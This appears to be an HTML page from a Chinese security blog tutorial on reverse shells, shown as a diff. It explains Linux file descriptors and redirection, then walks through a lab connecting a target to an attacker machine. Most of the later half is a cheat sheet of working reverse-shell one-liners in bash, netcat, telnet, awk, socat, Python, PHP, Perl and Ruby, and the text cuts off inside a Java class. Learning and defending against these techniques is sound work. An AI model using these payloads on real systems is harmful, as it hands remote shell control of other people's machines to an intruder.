@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        反弹shell |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">反弹shell</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv3</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-29 15:31:07
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
+<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
+<ol>
+<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+</li>
+<li><p>它的ip会动态改变，你不能持续控制。</p>
+</li>
+<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+</li>
+<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
+</li>
+</ol>
+<p>这些情况都可以通过反弹shell来解决。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
+<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+</blockquote>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<table>
+<thead>
+<tr>
+<th>描述符</th>
+<th>用途</th>
+<th>stdio流</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>标准输入</td>
+<td>stdin</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出</td>
+<td>stdout</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误</td>
+<td>stderr</td>
+</tr>
+</tbody></table>
+<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
+<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
+<ol>
+<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
+<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
+</ol>
+<p><strong>重点</strong>：</p>
+<ol>
+<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
+</li>
+<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
+</li>
+<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
+</li>
+<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
+</li>
+</ol>
+<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
+<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
+<p>example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
+<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
+<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
+<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
+<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
+<p>说明：</p>
+<ol>
+<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
+</li>
+<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
+</li>
+</ol>
+<p><strong>重点：</strong></p>
+<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
+<ul>
+<li>cmd &gt; file 2&gt;&amp;1</li>
+</ul>
+<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
+<ul>
+<li>cmd 2&gt;&amp;1 &gt;file</li>
+</ul>
+<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
+<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
+<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
+<p><strong>重点：</strong></p>
+<p>格式： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
+<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
+<p>实验环境：</p>
+<ul>
+<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
+</li>
+<li><p>攻击机（Kali）IP：192.168.91.128</p>
+</li>
+</ul>
+<p>首先在攻击机上开启监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>然后再靶机上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>然后就可以看到攻击机控制了靶机的shell</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
+<p>命令解释：</p>
+<ul>
+<li><p><strong>bash -i</strong></p>
+<ol>
+<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+</li>
+<li><p>-i 这个参数表示的是产生交互式的shell</p>
+</li>
+</ol>
+</li>
+<li><p><strong>/dev/tcp/ip/port</strong></p>
+</li>
+</ul>
+<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>交互重定向</strong></li>
+</ul>
+<p>把上述的两个命令组合起来并使用重定向：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
+<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
+<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
+<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
+<p>如果没有 -e 选项的话还可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
+<p>靶机中执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
+<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
+<p>example：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span 